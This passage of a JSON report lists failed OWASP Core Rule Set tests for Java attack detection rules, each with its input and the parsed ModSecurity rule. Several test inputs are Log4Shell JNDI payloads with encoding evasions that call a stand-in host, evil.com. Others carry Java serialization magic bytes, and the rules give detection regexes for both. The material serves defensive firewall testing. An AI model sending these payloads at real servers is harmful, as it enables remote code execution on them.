    "description" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 21,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026#123;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 22,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 22,
      "desc" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24&lcub;\\u006A&#110;di:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 23,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}",
            "Content-Type" : "text/html"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944152",
    "test_id" : 24,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944152.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
    "cause" : "failed expect_id check: 944152 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 24,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion, omitting terminal semi-colon",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbracejndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944152 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944152,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This is a stricter sibling of 944150."
        }, {
          "type" : "Comment",
          "text" : " It simply checks for the existence of `${`, taking into account the same encoding evasions"
        }, {
          "type" : "Comment",
          "text" : " as 944150."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944152.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944152"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944152
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/4"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl4=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944200",
    "test_id" : 1,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944200.yaml",
    "description" : "Argument test includes java serialization magic bytes, base64 encoded request",
    "cause" : "failed expect_id check: 944200 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920451 - HTTP header is restricted by policy (host)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (user-agent)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-encoding)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-language)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept-charset)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (content-type)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (accept)", "phase=1 rule_id=920451 - HTTP header is restricted by policy (content-length)", "phase=1 rule_id=932237 - Remote Command Execution: Unix Shell Code Found in REQUEST_HEADERS", "phase=2 rule_id=920250 - UTF8 Encoding Abuse Attack Attempt", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 1,
      "desc" : "Argument test includes java serialization magic bytes, base64 encoded request",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "encoded_request" : "UE9TVCAvIEhUVFAvMS4wDQpIb3N0OiBsb2NhbGhvc3QNClVzZXItQWdlbnQ6IE9XQVNQIE1vZFNlY3VyaXR5IENvcmUgUnVsZSBTZXQNCkFjY2VwdDogdGV4dC94bWwsYXBwbGljYXRpb24veG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCx0ZXh0L2h0bWw7cT0wLjksdGV4dC9wbGFpbjtxPTAuOCxpbWFnZS9wbmcsKi8qO3E9MC41DQpBY2NlcHQtQ2hhcnNldDogSVNPLTg4NTktMSx1dGYtODtxPTAuNywqO3E9MC43DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsZGVmbGF0ZQ0KQWNjZXB0LUxhbmd1YWdlOiBlbi11cyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5DQoNCnRlc3Q9rO0ABQ0KDQo="
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944200 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944200,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Apache Commons (CVE-2015-4852) ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Detect exploitation of \"Java deserialization\" Apache Commons."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Based on rules by @spartantri."
        }, {
          "type" : "Comment",
          "text" : " https://spartantri.com/ModSecurity/?p=44"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Interesting references about the vulnerability"
        }, {
          "type" : "Comment",
          "text" : " https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/"
        }, {
          "type" : "Comment",
          "text" : " https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Potential false positives with random fields, the anomaly level is set low to avoid blocking request"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\xac\\xed\\x00\\x05"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944200
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944210",
    "test_id" : 6,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944210.yaml",
    "description" : "XML element includes keyword rO0ABQ",
    "cause" : "failed no_expect_ids check: 944210 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use", "phase=2 rule_id=944210 - Magic bytes Detected Base64 Encoded, probable java serialization in use" ]
    },
    "test" : {
      "test_id" : 6,
      "desc" : "XML element includes keyword rO0ABQ",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><rO0ABQ attribute_name=\"attribute_value\">value</rO0ABQ></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944210 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944210,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Detecting possible base64 text to match encoded magic bytes \\xac\\xed\\x00\\x05 with padding encoded in base64 strings are rO0ABQ KztAAU Cs7QAF"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:rO0ABQ|KztAAU|Cs7QAF)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944210
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Magic bytes Detected Base64 Encoded, probable java serialization in use"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
